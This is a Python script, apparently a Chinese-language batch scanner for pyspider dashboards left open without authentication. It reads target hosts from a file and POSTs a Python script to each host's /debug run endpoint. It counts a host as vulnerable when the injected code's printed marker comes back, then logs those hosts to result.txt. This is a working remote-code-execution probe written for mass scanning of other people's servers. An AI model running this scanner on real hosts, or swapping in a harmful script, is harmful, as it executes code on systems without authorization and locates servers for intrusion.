#title="Dashboard - pyspider"
import requests
import datetime

def check_fast(url):
    '''
    fast check
    check title only
    '''
    if "http" in url:
        url = url
    else:
        url = "http://" + url
    try:
        r=requests.get(url=url,timeout=1)
        if '''<a class="btn btn-default btn-info" href='/tasks' target=_blank>Recent Active Tasks</a>''' in r.text:
            return True
    except Exception:
        return False
    return False

def check_accurate(url):
    '''
    accurate check
    check if python script can be executed
    '''
    if "http" in url:
        url = url + "/debug/pyspidervulntest/run"
    else:
        url = "http://" + url + "/debug/pyspidervulntest/run"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = '''
    webdav_mode=false&script=from+pyspider.libs.base_handler+import+*%0Aclass+Handler(BaseHandler)%3A%0A++++def+on_start(self)%3A%0A++++++++print('pyspidervulnerable')&task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D
    '''
    try:
        r = requests.post(url=url, data=data, headers=headers, timeout=1)
        if '"logs": "pyspidervulnerable\\n"' in r.text:
            return True
    except Exception:
        return False
    return False


def main():
    print("Pyspider未授权访问批量扫描器")
    print("Author:sunian")
    print("[1]精准扫描")
    print("[2]快速扫描")
    opt = input("选择扫描模式:")
    if str(opt).strip() == "1":
        scan_func = check_accurate
    else:
        scan_func = check_fast

    f = open("ip.txt")  # 返回一个文件对象
    line = f.readline()  # 调用文件的 readline()方法
    f = open("result.txt", "a")
    f.write("pyspider未授权访问漏洞扫描报告\n扫描时间:" + datetime.datetime.now().strftime('%Y-%m-%d') + "\n存在漏洞的主机如下:\n")
    count = 0
    for line in open("ip.txt"):
        url = line.strip()

        if scan_func(url):
            print("\x1b[31m" + "[-]", url, "存在漏洞" + "\x1b[39m")
            f.write(url + "\n")
            count += 1
        else:
            print("[*]", url, "不存在漏洞")
    print("扫描完毕，共发现" + str(count) + "台主机存在漏洞")
    f.write("扫描完毕，共发现" + str(count) + "台主机存在漏洞")
    f.close()
    print("扫描结果已经存到result.txt")
if __name__ == "__main__":
    main()